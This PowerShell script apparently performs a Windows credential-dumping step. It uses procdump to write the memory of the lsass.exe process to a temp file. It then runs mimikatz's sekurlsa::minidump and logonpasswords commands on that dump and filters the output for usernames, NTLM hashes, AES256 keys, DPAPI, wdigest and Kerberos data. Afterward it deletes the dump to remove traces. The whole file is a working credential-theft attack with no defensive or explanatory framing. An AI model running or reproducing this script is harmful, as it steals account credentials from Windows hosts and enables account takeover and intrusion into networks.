# 3.5K v4: procdump with output capture + mimikatz minidump via direct argv
$ErrorActionPreference = 'Continue'
$pd = 'C:\Windows\Temp\cadre-tools\procdump64.exe'
$mik = 'C:\Windows\Temp\cadre-tools\mimikatz.exe'
$dump = 'C:\Windows\Temp\cadre-lsass3.dmp'
$pdo = 'C:\Windows\Temp\pd.out'
$o = 'C:\Windows\Temp\cadre-minidump2.txt'

# 1. procdump -> output file
Remove-Item $dump, $pdo -ErrorAction SilentlyContinue
cmd.exe /c "`"$pd`" -accepteula -ma lsass.exe `"$dump`" > `"$pdo`" 2>&1"
Start-Sleep -Seconds 5
Write-Output '=== PROCDUMP OUTPUT ==='
Get-Content $pdo -ErrorAction SilentlyContinue | Select-Object -First 12 | ForEach-Object { Write-Output "PD|$_" }
Write-Output "DUMP_EXISTS $(Test-Path $dump)"
if (Test-Path $dump) { Write-Output "DUMP_SIZE $((Get-Item $dump).Length)" }

# 2. Parse with direct argv (no cmd quoting)
if (Test-Path $dump) {
    Remove-Item $o -ErrorAction SilentlyContinue
    & $mik "sekurlsa::minidump $dump" 'sekurlsa::logonpasswords' 'exit' > $o 2>&1
    Start-Sleep -Seconds 2
    Write-Output "MINIDUMP_OUT_SIZE $((Get-Item $o -ErrorAction SilentlyContinue).Length)"
    Get-Content $o -ErrorAction SilentlyContinue | Select-String -Pattern 'Authentication Id|Username|Domain|NTLM|AES256|DPAPI|ERROR|minidump|msv|tspkg|wdigest|kerberos|Logon' | Select-Object -First 60 | ForEach-Object { $_.Line }
    Remove-Item $dump -ErrorAction SilentlyContinue
    Write-Output "DUMP_CLEANED $(-not (Test-Path $dump))"
} else { Write-Output 'DUMP_MISSING' }
Write-Output '3.5K_V4_DONE'
